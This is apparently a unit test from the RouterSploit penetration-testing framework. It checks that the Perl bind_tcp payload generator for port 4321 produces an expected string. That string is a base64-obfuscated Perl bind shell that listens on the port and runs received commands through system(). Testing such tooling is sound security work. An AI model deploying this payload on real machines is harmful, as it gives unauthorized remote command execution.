from routersploit.modules.payloads.perl.bind_tcp import Exploit


# perl bind tcp payload with rport=4321
bind_tcp = (
    "use MIME::Base64;eval(decode_base64('dXNlIElPO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKExvY2FsUG9ydCw0MzIxLFJldXNlLDEsTGlzdGVuKS0+YWNjZXB0OyR+LT5mZG9wZW4oJGMsdyk7U1RESU4tPmZkb3BlbigkYyxyKTt3aGlsZSg8Pil7aWYoJF89fiAvKC4qKS8pe3N5c3RlbSAkMTt9fTs='));"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Exploit()
    payload.rport = 4321

    assert payload.generate() == bind_tcp
